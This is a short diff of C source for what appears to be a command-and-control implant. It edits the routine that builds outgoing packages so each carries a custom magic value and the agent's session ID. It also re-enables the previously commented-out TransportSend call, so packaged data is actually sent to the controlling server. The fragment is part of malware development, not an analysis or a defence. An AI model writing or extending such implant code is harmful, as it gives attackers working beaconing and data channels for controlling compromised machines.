@@ -104,8 +104,8 @@ FUNC PPACKAGE PackageCreate( UINT32 CommandID )
     Package->Encrypt   = FALSE;
 
     PackageAddInt32( Package, 0 );
-    PackageAddInt32( Package, 0x00 );
-    PackageAddInt32( Package, Instance()->Config.Session.AgentId );
+    PackageAddInt32( Package, BLACKOUT_MAGIC_VALUE );
+    PackageAddInt32( Package, Instance()->Session.AgentId );
     PackageAddInt32( Package, CommandID );
 
     return Package;
@@ -155,9 +155,9 @@ FUNC BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
         // writes package length to buffer
         Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );
 
-        //if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
-        //    Success = TRUE;
-        //}
+        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
+            Success = TRUE;
+        }
 
         PackageDestroy( Package );
     }
